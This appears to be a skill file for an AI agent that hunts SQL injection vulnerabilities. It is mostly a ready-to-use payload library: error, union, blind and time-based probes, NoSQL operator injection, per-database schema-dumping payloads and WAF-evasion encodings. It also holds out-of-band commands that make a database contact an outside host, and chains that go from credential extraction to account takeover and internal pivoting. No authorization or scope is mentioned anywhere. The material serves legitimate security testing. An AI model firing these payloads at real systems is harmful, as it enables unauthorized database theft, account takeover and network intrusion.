---
name: hunt-sqli
description: "Hunting skill for SQL Injection (SQLi) vulnerabilities. Error-based, union-based, blind/time-based, second-order, noSQL injection. Detection patterns, payload libraries, bypass techniques, evidence confirmation. Use when testing any endpoint with database interaction."
---

# Hunt: SQL Injection

## Detection Patterns

### Classic Error-Based
```
?id=1'
?id=1"
?id=1\
?id=1%27
```
Response signals: SQL error in HTML, 500 error on quote (200 on no-quote), different page content.

### Union-Based
```
?id=1 UNION SELECT 1,2,3--
?id=1 UNION SELECT @@version,user(),database()--
?id=-1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables--
```

### Blind Boolean
```
?id=1 AND 1=1--  (true)
?id=1 AND 1=2--  (false - different response)
```
Compare response size, status code, content. Use for boolean-based inference.

### Time-Based Blind
```
?id=1; WAITFOR DELAY '0:0:5'--
?id=1 AND SLEEP(5)--
PG_SLEEP(5)--
```
5-second delay on true condition. Polling often required.

### Second-Order SQLi
Inject payload into field (profile name, address) that is stored then used unsafely in another query.

### NoSQL Injection (MongoDB)
```
?id[$ne]=null
?id[$gt]=
?id[$regex]=.*
{"id": {"$ne": null}}
```

## Database-Specific Payloads

### MySQL
```
' OR '1'='1' --
' UNION SELECT null, @@version, database() #
' UNION SELECT null, table_name, column_name FROM information_schema.columns #
```

### PostgreSQL
```
' UNION SELECT null, current_database(), version() --
' UNION SELECT null, table_name, column_name FROM information_schema.columns WHERE table_schema='public' --
```

### MSSQL
```
' WAITFOR DELAY '0:0:5' --
' UNION SELECT null, @@version, db_name() --
```

### SQLite
```
' UNION SELECT null, sql, null FROM sqlite_master --
```

## WAF Bypass Techniques
```
UNION SELECT -> UN/**/ION SEL/**/ECT
OR 1=1 -> OR 1=2 (if WAF blocks OR)
' OR '1'='1' -> %27%20%4f%52%20%31%3d%31%20%2d%2d%20
?id=1 AND SLEEP(5) -> id=1/**/AND/**/SLEEP(5)
```

## Confirmation Gates
- Error-based: SQL error message visible → confirmed
- Union: Data from another table visible → confirmed
- Blind boolean: Consistent true/false response differential → provisional
- Time-based: 5s delay on true, immediate on false → confirmed
- NoSQL: `$ne: null` returns data, direct query returns nothing → confirmed

## OOB Gate for Blind SQLi
Blind SQLi without observable delay requires out-of-band channel:
```
EXEC master..xp_dirtree '\\<collab>\test'
LOAD_FILE('\\\\<collab>\\test')
COPY (SELECT 'test') TO '\\\\<collab>\\test'
```

## Chain Templates
- SQLi + Information Schema → extract all user credentials → ATO chain
- SQLi + File Read → read source code → RCE via code analysis
- SQLi + SSRF → use SQL server as proxy → internal network pivot
- Time-blind SQLi + Cache poisoning → forced cache of stale data
